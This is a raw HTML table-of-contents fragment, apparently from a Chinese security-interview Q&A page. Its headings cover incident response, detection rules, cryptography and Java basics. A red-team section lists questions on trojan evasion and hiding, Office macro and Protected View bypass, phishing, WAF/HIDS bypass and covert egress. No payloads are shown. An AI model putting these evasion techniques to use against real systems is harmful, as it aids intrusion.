href="#%E6%8A%BD%E8%B1%A1%E6%9D%A5%E7%9C%8B%E4%B8%BB%E6%9C%BA%E4%B8%AD%E6%9C%89%E5%93%AA%E4%BA%9B%E6%97%A5%E5%BF%97%E5%8F%AF%E5%AE%9E%E7%8E%B0%E6%96%B9%E5%BC%8F%EF%BC%9F"><span class="toc-number">82.2.</span> <span class="toc-text">抽象来看主机中有哪些日志可实现方式？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E4%B8%AA%E9%BB%91%E5%AE%A2%E5%85%A5%E4%BE%B5%E4%B8%BB%E6%9C%BA%E5%90%8E%E6%A4%8D%E5%85%A5%E4%BA%86%E4%B8%80%E4%B8%AA%E6%9C%A8%E9%A9%AC%EF%BC%8C%E5%B9%B6%E6%93%A6%E9%99%A4%E4%BA%86%E5%90%84%E7%A7%8D%E6%97%A5%E5%BF%97%EF%BC%8C%E5%A6%82%E4%BD%95%E6%89%BE%E5%87%BA%E5%85%B6%E5%A6%82%E4%BD%95%E5%85%A5%E4%BE%B5%E7%9A%84%E4%BB%A5%E5%8F%8A%E5%85%A5%E4%BE%B5%E5%90%8E%E5%81%9A%E4%BA%86%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-number">82.3.</span> <span class="toc-text">一个黑客入侵主机后植入了一个木马，并擦除了各种日志，如何找出其如何入侵的以及入侵后做了什么？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%90%E4%B8%AA%E9%BB%91%E5%AE%A2%E5%85%A5%E4%BE%B5%E4%B8%BB%E6%9C%BA%E5%90%8E%EF%BC%8C%E6%8B%BF%E5%88%B0%E4%BA%86-root-%E6%9D%83%E9%99%90%EF%BC%8C%E5%A6%82%E4%BD%95%E6%AD%A2%E8%A1%80%EF%BC%9F"><span class="toc-number">82.4.</span> <span class="toc-text">某个黑客入侵主机后，拿到了 root 权限，如何止血？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%84%9F%E7%9F%A5%E5%88%B0%E9%BB%91%E5%AE%A2%E5%85%A5%E4%BE%B5%E4%BA%86%E6%89%80%E6%9C%89%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%8C%E6%80%8E%E4%B9%88%E5%8A%9E%EF%BC%9F"><span class="toc-number">82.5.</span> <span class="toc-text">感知到黑客入侵了所有服务器，怎么办？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%87%86%E7%A1%AE%E8%AF%86%E5%88%AB%E5%9F%9F%E5%90%8D%E6%8E%A2%E6%B5%8B%EF%BC%9F"><span class="toc-number">82.6.</span> <span class="toc-text">如何准确识别域名探测？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%87%86%E7%A1%AE%E8%AF%86%E5%88%AB%E7%AB%AF%E5%8F%A3%E6%8E%A2%E6%B5%8B%EF%BC%9F"><span class="toc-number">82.7.</span> <span class="toc-text">如何准确识别端口探测？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%87%86%E7%A1%AE%E8%AF%86%E5%88%AB%E6%96%87%E4%BB%B6%E9%81%8D%E5%8E%86%E6%8E%A2%E6%B5%8B%EF%BC%9F"><span class="toc-number">82.8.</span> <span class="toc-text">如何准确识别文件遍历探测？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL-%E6%B3%A8%E5%85%A5%E6%8B%A6%E6%88%AA%E8%A7%84%E5%88%99%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%EF%BC%9F"><span class="toc-number">82.9.</span> <span class="toc-text">SQL 注入拦截规则如何实现？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E6%84%9F%E7%9F%A5%EF%BC%9F"><span class="toc-number">82.10.</span> <span class="toc-text">如何实现页面篡改感知？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E9%A1%B5%E9%9D%A2%E6%8C%82%E9%A9%AC%E6%84%9F%E7%9F%A5%EF%BC%9F"><span class="toc-number">82.11.</span> <span class="toc-text">如何实现页面挂马感知？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E7%A1%AE%E4%BF%9D%E7%BA%BF%E4%B8%8A%E6%8B%A6%E6%88%AA%E8%A7%84%E5%88%99%E4%B8%8D%E5%87%BA%E7%8E%B0%E8%AF%AF%E6%8B%A6%E6%88%AA%EF%BC%9F"><span class="toc-number">82.12.</span> <span class="toc-text">如何确保线上拦截规则不出现误拦截？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E8%AF%86%E5%88%AB%E5%85%AC%E5%85%B1%E5%92%8C%E7%A7%81%E6%9C%89%E6%8E%A5%E5%8F%A3%EF%BC%9F"><span class="toc-number">82.13.</span> <span class="toc-text">如何识别公共和私有接口？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E8%AF%86%E5%88%AB%E6%9C%BA%E5%99%A8%E8%A1%8C%E4%B8%BA%E8%AF%B7%E6%B1%82%EF%BC%9F"><span class="toc-number">82.14.</span> <span class="toc-text">如何识别机器行为请求？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E6%84%9F%E7%9F%A5%E8%A2%AB%E5%8A%A8%E9%A3%8E%E9%99%A9%EF%BC%9F"><span class="toc-number">82.15.</span> <span class="toc-text">如何感知被动风险？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD%E6%94%BB%E5%87%BB%E8%AF%B7%E6%B1%82%E6%98%AF%E5%AE%9A%E7%82%B9%E6%94%BB%E5%87%BB%E8%BF%98%E6%98%AF%E9%9A%8F%E6%9C%BA%E6%89%AB%E6%8F%8F%EF%BC%9F"><span class="toc-number">82.16.</span> <span class="toc-text">如何判断攻击请求是定点攻击还是随机扫描？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E8%AF%86%E5%88%AB%E5%AE%A2%E6%88%B7%E7%AB%AF%E7%9A%84%E7%B3%BB%E7%BB%9F%E7%9C%9F%E5%AE%9E%E7%B1%BB%E5%9E%8B%EF%BC%9F"><span class="toc-number">82.17.</span> <span class="toc-text">如何识别客户端的系统真实类型？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A3%80%E6%B5%8B%E6%96%B9%E6%B3%95%EF%BC%9A1-%E5%9F%BA%E4%BA%8E-User-Agent-%EF%BC%9A-2-JS-%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%EF%BC%9A-%E9%80%9A%E8%BF%87-navigator-platform-%E8%8E%B7%E5%8F%96%E7%B3%BB%E7%BB%9F%E7%B1%BB%E5%9E%8B%EF%BC%9A-3-TLS-%E6%8C%87%E7%BA%B9%E5%88%86%E6%9E%90%EF%BC%9A-%E9%80%9A%E8%BF%87-JA3-%E8%AF%86%E5%88%AB%E7%B3%BB%E7%BB%9F%E7%89%B9%E5%BE%81%EF%BC%9A"><span class="toc-number">83.</span> <span class="toc-text">检测方法：1. **基于 User-Agent**：   1grep &quot;Windows NT&quot; &#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log2. JS 指纹识别：   - 通过 navigator.platform 获取系统类型：     1console.log(navigator.platform);3. TLS 指纹分析：   - 通过 JA3 识别系统特征：     1ja3 -r capture.pcap</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%89%E5%93%AA%E4%BA%9B%E5%8F%AF%E4%BB%A5%E6%94%B6%E9%9B%86%E7%9A%84%E6%83%85%E6%8A%A5%E6%B8%A0%E9%81%93%EF%BC%9F"><span class="toc-number">83.1.</span> <span class="toc-text">有哪些可以收集的情报渠道？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%BF%AB%E9%80%9F%E7%AD%9B%E9%80%89%E5%87%BA%E6%9C%80%E6%96%B0%E7%9A%84-CVE-%E5%AF%B9%E6%88%91%E4%BB%AC%E6%98%AF%E5%90%A6%E6%9C%89%E5%AE%9E%E9%99%85%E5%BD%B1%E5%93%8D%EF%BC%9F"><span class="toc-number">83.2.</span> <span class="toc-text">如何快速筛选出最新的 CVE 对我们是否有实际影响？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%99%E5%AE%9A%E4%B8%80%E4%B8%AA%E7%BD%91%E5%9D%80%EF%BC%8C%E5%A6%82%E4%BD%95%E8%87%AA%E5%8A%A8%E5%8C%96%E8%AF%86%E5%88%AB%E5%85%B6%E6%98%AF%E5%90%A6%E4%B8%BA%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%EF%BC%9F"><span class="toc-number">83.3.</span> <span class="toc-text">给定一个网址，如何自动化识别其是否为钓鱼网站？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E8%AF%86%E5%88%AB%E4%BB%BF%E5%86%92-APP%EF%BC%9F"><span class="toc-number">83.4.</span> <span class="toc-text">如何识别仿冒 APP？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E8%AF%86%E5%88%AB%E4%B8%80%E4%B8%AA%E6%B2%A1%E6%9C%89%E7%99%BB%E9%99%86%E7%9A%84%E7%94%A8%E6%88%B7%E7%9C%9F%E5%AE%9E%E8%BA%AB%E4%BB%BD%EF%BC%9F"><span class="toc-number">83.5.</span> <span class="toc-text">如何识别一个没有登陆的用户真实身份？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E6%89%BE%E5%87%BA%E5%AF%B9%E6%88%91%E4%BB%AC%E4%B8%9A%E5%8A%A1%E5%AE%9E%E6%96%BD%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E7%9A%84%E9%BB%91%E5%AE%A2%E7%9C%9F%E5%AE%9E%E8%BA%AB%E4%BB%BD%EF%BC%9F"><span class="toc-number">83.6.</span> <span class="toc-text">如何找出对我们业务实施网络攻击的黑客真实身份？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%BD%E5%86%85%E5%92%8C%E5%9B%BD%E5%A4%96%E6%94%BB%E5%87%BB%E7%89%B9%E7%82%B9%E6%9C%89%E4%BB%80%E4%B9%88%E5%8C%BA%E5%88%AB%EF%BC%9F"><span class="toc-number">83.7.</span> <span class="toc-text">国内和国外攻击特点有什么区别？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%88%86%E7%B1%BB%E5%92%8C%E7%AE%97%E6%B3%95%E6%9C%89%E5%93%AA%E4%BA%9B%EF%BC%9F"><span class="toc-number">83.8.</span> <span class="toc-text">常见加解密分类和算法有哪些？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%93%AA%E4%BA%9B-Hash-%E5%92%8C%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E4%B8%8D%E5%BB%BA%E8%AE%AE%E4%BD%BF%E7%94%A8%EF%BC%9F"><span class="toc-number">83.9.</span> <span class="toc-text">哪些 Hash 和加密算法不建议使用？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A1%AC%E7%BC%96%E7%A0%81%E5%AF%86%E9%92%A5%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3%EF%BC%9F"><span class="toc-number">83.10.</span> <span class="toc-text">硬编码密钥如何解决？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PKI-%E5%8E%9F%E7%90%86"><span class="toc-number">83.11.</span> <span class="toc-text">PKI 原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%BD%E5%AF%86%E7%9A%84%E5%BA%95%E5%B1%82%E5%8E%9F%E7%90%86%EF%BC%9F"><span class="toc-number">83.12.</span> <span class="toc-text">国密的底层原理？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E5%A6%82%E4%BD%95%E4%BF%9D%E5%AD%98%E8%87%B3%E6%95%B0%E6%8D%AE%E5%BA%93%EF%BC%9F"><span class="toc-number">83.13.</span> <span class="toc-text">密码如何保存至数据库？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E8%AE%A9%E5%AF%86%E7%A0%81%E8%BD%AE%E8%BD%AC%EF%BC%9F"><span class="toc-number">83.14.</span> <span class="toc-text">如何让密码轮转？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%AF%E4%BB%A5%E5%9C%A8%E5%93%AA%E4%BA%9B%E5%B1%82%E6%AC%A1%E5%AF%B9%E6%96%87%E4%BB%B6%E8%BF%9B%E8%A1%8C%E5%8A%A0%E5%AF%86%EF%BC%9F"><span class="toc-number">83.15.</span> <span class="toc-text">可以在哪些层次对文件进行加密？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E6%8A%80%E6%9C%AF%E6%89%8B%E6%AE%B5%E5%AE%9E%E7%8E%B0%E5%85%A8%E7%AB%99-HTTPS%EF%BC%9F"><span class="toc-number">83.16.</span> <span class="toc-text">如何技术手段实现全站 HTTPS？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E8%93%9D%E5%86%9B"><span class="toc-number">84.</span> <span class="toc-text">安全蓝军</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E9%80%9A%E8%BF%87%E7%A8%8B%E5%BA%8F%E5%88%A4%E6%96%AD%E4%B8%80%E6%89%B9%E5%9F%9F%E5%90%8D%E6%98%AF%E5%90%A6%E6%B3%9B%E8%A7%A3%E6%9E%90%E5%9F%9F%E5%90%8D%EF%BC%9F"><span class="toc-number">84.1.</span> <span class="toc-text">如何通过程序判断一批域名是否泛解析域名？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Python-%E5%AE%9E%E7%8E%B0%EF%BC%9A"><span class="toc-number">85.</span> <span class="toc-text">Python 实现：12345678910111213import dns.resolverdef is_wildcard(domain):    try:        test_subdomain &#x3D; f&quot;random-test.{domain}&quot;        answer &#x3D; dns.resolver.resolve(test_subdomain, &#39;A&#39;)        return answer.rrset is not None  # 有解析结果，则为泛解析    except:        return Falsedomain_list &#x3D; [&quot;example.com&quot;, &quot;wildcard.example.com&quot;]for domain in domain_list:    print(f&quot;{domain}: {&#39;泛解析&#39; if is_wildcard(domain) else &#39;非泛解析&#39;}&quot;)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%E6%9C%89%E5%93%AA%E4%BA%9B%E6%96%B9%E5%BC%8F%EF%BC%9F%E5%93%AA%E7%A7%8D%E6%96%B9%E5%BC%8F%E6%9C%80%E6%9C%89%E6%95%88%EF%BC%9F"><span class="toc-number">85.1.</span> <span class="toc-text">木马免杀有哪些方式？哪种方式最有效？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%A8%E9%A9%AC%E9%9A%90%E8%97%8F%E6%9C%89%E5%93%AA%E4%BA%9B%EF%BC%9F%E5%93%AA%E7%A7%8D%E9%9A%90%E8%97%8F%E6%96%B9%E5%BC%8F%E5%BD%93%E5%89%8D%E6%9C%80%E6%9C%89%E6%95%88%EF%BC%9F"><span class="toc-number">85.2.</span> <span class="toc-text">木马隐藏有哪些？哪种隐藏方式当前最有效？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Word-DDE-%E5%92%8C-Office-%E5%AE%8F%E6%9C%89%E4%BB%80%E4%B9%88%E4%BC%98%E5%8A%BF%EF%BC%9F"><span class="toc-number">85.3.</span> <span class="toc-text">Word DDE 和 Office 宏有什么优势？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E7%BB%95%E8%BF%87-Office-%E5%8F%97%E4%BF%9D%E6%8A%A4%E8%A7%86%E5%9B%BE%EF%BC%9F"><span class="toc-number">85.4.</span> <span class="toc-text">如何绕过 Office 受保护视图？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%89%E5%93%AA%E4%BA%9B%E6%9C%89%E6%95%88%E7%9A%84%E9%92%93%E9%B1%BC%E6%96%B9%E5%BC%8F%EF%BC%9F"><span class="toc-number">85.5.</span> <span class="toc-text">有哪些有效的钓鱼方式？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E7%BB%95%E8%BF%87-WAF%E3%80%81HIDS%E3%80%81%E5%A8%81%E8%83%81%E6%84%9F%E7%9F%A5%EF%BC%9F"><span class="toc-number">85.6.</span> <span class="toc-text">如何绕过 WAF、HIDS、威胁感知？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%9C%A8%E7%A6%81%E6%AD%A2%E5%87%BA%E7%BD%91%E7%9A%84%E6%9C%BA%E5%99%A8%E4%B8%8A%E8%AE%BF%E9%97%AE%E4%BA%92%E8%81%94%E7%BD%91%EF%BC%9F"><span class="toc-number">85.7.</span> <span class="toc-text">如何在禁止出网的机器上访问互联网？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ew%E3%80%81frp-%E5%B7%AE%E5%BC%82%EF%BC%9F"><span class="toc-number">85.8.</span> <span class="toc-text">ew、frp 差异？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ICMP-%E5%A6%82%E4%BD%95%E5%87%BA%E7%BD%91%EF%BC%9F"><span class="toc-number">85.9.</span> <span class="toc-text">ICMP 如何出网？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8-XSS-%E8%AE%A9%E5%BD%B1%E5%93%8D%E6%9C%80%E5%A4%A7%E5%8C%96%EF%BC%9F"><span class="toc-number">85.10.</span> <span class="toc-text">如何利用 XSS 让影响最大化？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%85%A8%E6%B5%81%E7%A8%8B%E6%9C%80%E5%A4%A7%E9%99%90%E5%BA%A6%E9%99%8D%E4%BD%8E%E8%A2%AB%E7%BA%A2%E5%86%9B%E5%8F%91%E7%8E%B0%E6%A6%82%E7%8E%87%EF%BC%9F"><span class="toc-number">85.11.</span> <span class="toc-text">如何全流程最大限度降低被红军发现概率？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91%E5%B2%97%E4%BD%8D"><span class="toc-number">86.</span> <span class="toc-text">安全开发岗位</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#equals-%E4%B8%8E-%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">86.1.</span> <span class="toc-text">equals 与 &#x3D;&#x3D; 的区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Java-%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%8C%BA%E5%9F%9F%E5%A6%82%E4%BD%95%E5%88%92%E5%88%86%EF%BC%9F"><span class="toc-number">86.2.</span> <span class="toc-text">Java 虚拟机区域如何划分？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E9%87%8D%E8%BD%BD%E4%B8%8E%E6%96%B9%E6%B3%95%E9%87%8D%E5%86%99%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">86.3.</span> <span class="toc-text">方法重载与方法重写的区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HashMap%E3%80%81HashTable%E3%80%81ConcurrentHashMap-%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">86.4.</span> <span class="toc-text">HashMap、HashTable、ConcurrentHashMap 的区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9B%E7%A8%8B%E5%92%8C%E7%BA%BF%E7%A8%8B%E5%8C%BA%E5%88%AB%EF%BC%8C%E7%BA%BF%E7%A8%8B%E9%97%B4%E9%80%9A%E4%BF%A1%E6%9C%89%E5%93%AA%E4%BA%9B%E6%96%B9%E5%BC%8F%EF%BC%9F"><span class="toc-number">86.5.</span> <span class="toc-text">进程和线程区别，线程间通信有哪些方式？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Java-BIO-NIO-AIO-%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F%E9%80%82%E7%94%A8%E5%93%AA%E4%BA%9B%E5%9C%BA%E6%99%AF%EF%BC%9F"><span class="toc-number">86.6.</span> <span class="toc-text">Java BIO&#x2F;NIO&#x2F;AIO 是什么？适用哪些场景？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%91%E4%B8%80%E4%B8%AA%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%EF%BC%88%E5%B7%A5%E5%8E%82%E3%80%81%E5%8D%95%E4%BE%8B%E3%80%81%E9%80%82%E9%85%8D%E5%99%A8%E3%80%81%E8%A7%82%E5%AF%9F%E8%80%85%EF%BC%89%E8%BF%9B%E8%A1%8C%E8%AE%B2%E8%A7%A3"><span class="toc-number">86.7.</span> <span class="toc-text">挑一个设计模式（工厂、单例、适配器、观察者）进行讲解</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F"><span class="toc-number">86.7.1.</span> <span class="toc-text">单例模式</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#synchronized-%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%EF%BC%9FObject-%E7%9A%84-wait%E3%80%81notify-%E6%96%B9%E6%B3%95%E6%9C%89%E4%BB%80%E4%B9%88%E4%BD%9C%E7%94%A8%EF%BC%9F"><span class="toc-number">86.8.</span> <span class="toc-text">synchronized 如何使用？Object 的 wait、notify 方法有什么作用？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sleep-%E5%92%8C-wait-%E6%9C%89%E4%BB%80%E4%B9%88%E5%8C%BA%E5%88%AB%EF%BC%9F"><span class="toc-number">86.9.</span> <span class="toc-text">sleep() 和 wait() 有什么区别？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E5%B9%82%E7%AD%89%E6%80%A7%EF%BC%9F%E4%B8%80%E8%88%AC%E6%9C%89%E4%BB%80%E4%B9%88%E6%96%B9%E5%BC%8F%E5%AE%9E%E7%8E%B0%EF%BC%9F"><span class="toc-number">86.10.</span> <span class="toc-text">什么是幂等性？一般有什么方式实现？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%A7%E6%96%87%E4%BB%B6%E5%B0%8F%E5%86%85%E5%AD%98%E7%9A%84%E6%8E%92%E5%BA%8F%E5%A6%82%E4%BD%95%E5%81%9A%EF%BC%9F"><span class="toc-number">86.11.</span> <span class="toc-text">大文件小内存的排序如何做？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%89-1-%E4%BA%BF%E4%B8%AA%E6%95%B0%E5%AD%97%EF%BC%8C%E5%85%B6%E4%B8%AD%E6%9C%89%E4%B8%A4%E4%B8%AA%E6%98%AF%E9%87%8D%E5%A4%8D%E7%9A%84%EF%BC%8C%E5%A6%82%E4%BD%95%E5%BF%AB%E9%80%9F%E6%89%BE%E5%88%B0%EF%BC%9F%E8%A6%81%E6%B1%82%E6%97%B6%E9%97%B4%E5%92%8C%E7%A9%BA%E9%97%B4%E6%9C%80%E4%BC%98%E3%80%82"><span class="toc-number">86.12.</span> <span class="toc-text">有 1 亿个数字，其中有两个是重复的，如何快速找到？要求时间和空间最优。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E4%BA%BF%E4%B8%AA%E9%9A%8F%E6%9C%BA%E7%94%9F%E6%88%90%E7%9A%84%E6%97%A0%E5%BA%8F%E6%95%B4%E6%95%B0%EF%BC%8C%E6%89%BE%E5%87%BA%E4%B8%AD%E9%97%B4%E5%A4%A7%E5%B0%8F%E7%9A%84%E5%80%BC%E3%80%82"><span class="toc-number">86.13.</span> <span class="toc-text">1 亿个随机生成的无序整数，找出中间大小的值。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E5%B7%A5%E5%85%B7%E5%8F%8A%E5%BC%82%E5%B8%B8%E6%8E%92%E6%9F%A5%E6%B5%81%E7%A8%8B%EF%BC%9F"><span class="toc-number">86.14.</span> <span class="toc-text">调试工具及异常排查流程？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B4%A2%E5%BC%95%E7%BB%93%E6%9E%84%EF%BC%8C%E4%BB%80%E4%B9%88%E6%83%85%E5%86%B5%E4%B8%8B%E5%BA%94%E8%AF%A5%E5%BB%BA%E5%94%AF%E4%B8%80%E7%B4%A2%E5%BC%95%EF%BC%9F"><span class="toc-number">86.15.</span> <span class="toc-text">数据库索引结构，什么情况下应该建唯一索引？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E5%88%86%E9%A1%B5%E8%AF%AD%E5%8F%A5%E5%A6%82%E4%BD%95%E5%86%99%EF%BC%9F"><span class="toc-number">86.16.</span> <span class="toc-text">数据库分页语句如何写？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MySQL-%E5%88%86%E9%A1%B5%E6%9F%A5%E8%AF%A2%EF%BC%9A%E4%BC%98%E5%8C%96%E6%96%B9%E5%BC%8F%EF%BC%9A1-%E4%BD%BF%E7%94%A8%E8%A6%86%E7%9B%96%E7%B4%A2%E5%BC%95%EF%BC%9A-2-%E9%81%BF%E5%85%8D-OFFSET-%E6%89%AB%E6%8F%8F%EF%BC%88%E9%80%82%E7%94%A8%E4%BA%8E%E5%A4%A7%E6%95%B0%E6%8D%AE%E9%87%8F%EF%BC%89%EF%BC%9A"><span class="toc-number">87.</span> <span class="toc-text">MySQL 分页查询：1SELECT * FROM users ORDER BY id LIMIT 10 OFFSET 20;优化方式：1. 使用覆盖索引：   1SELECT id, name FROM users WHERE status&#x3D;1 ORDER BY id LIMIT 10 OFFSET 20;2. 避免 OFFSET 扫描（适用于大数据量）：   1SELECT * FROM users WHERE id &gt; 1000 ORDER BY id LIMIT 10;</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTPS-%E4%BA%A4%E4%BA%92%E8%BF%87%E7%A8%8B"><span class="toc-number">87.1.</span> <span class="toc-text">HTTPS 交互过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#OAuth2-0-%E4%BA%A4%E4%BA%92%E8%BF%87%E7%A8%8B%E5%8F%8A%E4%B8%8D%E5%BD%93%E5%AE%89%E5%85%A8%E9%A3%8E%E9%99%A9"><span class="toc-number">87.2.</span> <span class="toc-text">OAuth2.0 交互过程及不当安全风险</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96-URL-%E5%86%85%E5%AE%B9%E6%97%B6%E7%9A%84%E5%AE%89%E5%85%A8%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="toc-number">87.3.</span> <span class="toc-text">获取 URL 内容时的安全注意事项</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E6%95%B0%E5%85%A5%E5%BA%93%E5%89%8D%E5%A6%82%E4%BD%95%E8%BF%87%E6%BB%A4%EF%BC%9F"><span class="toc-number">87.4.</span> <span class="toc-text">参数入库前如何过滤？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E5%99%A8%E5%92%8C%E6%8B%A6%E6%88%AA%E5%99%A8%E5%8E%9F%E7%90%86%E5%92%8C%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF%EF%BC%9F"><span class="toc-number">87.5.</span> <span class="toc-text">过滤器和拦截器原理和应用场景？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SESSION-%E5%92%8C-Cookie-%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">87.6.</span> <span class="toc-text">SESSION 和 Cookie 的区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SESSION-ID-%E5%A6%82%E4%BD%95%E4%B8%8D%E8%A2%AB-JavaScript-%E8%AF%BB%E5%8F%96%EF%BC%9F"><span class="toc-number">87.7.</span> <span class="toc-text">SESSION ID 如何不被 JavaScript 读取？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CSRF-Token-%E5%A6%82%E4%BD%95%E8%AE%BE%E8%AE%A1%EF%BC%9F"><span class="toc-number">87.8.</span> <span class="toc-text">CSRF Token 如何设计？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" 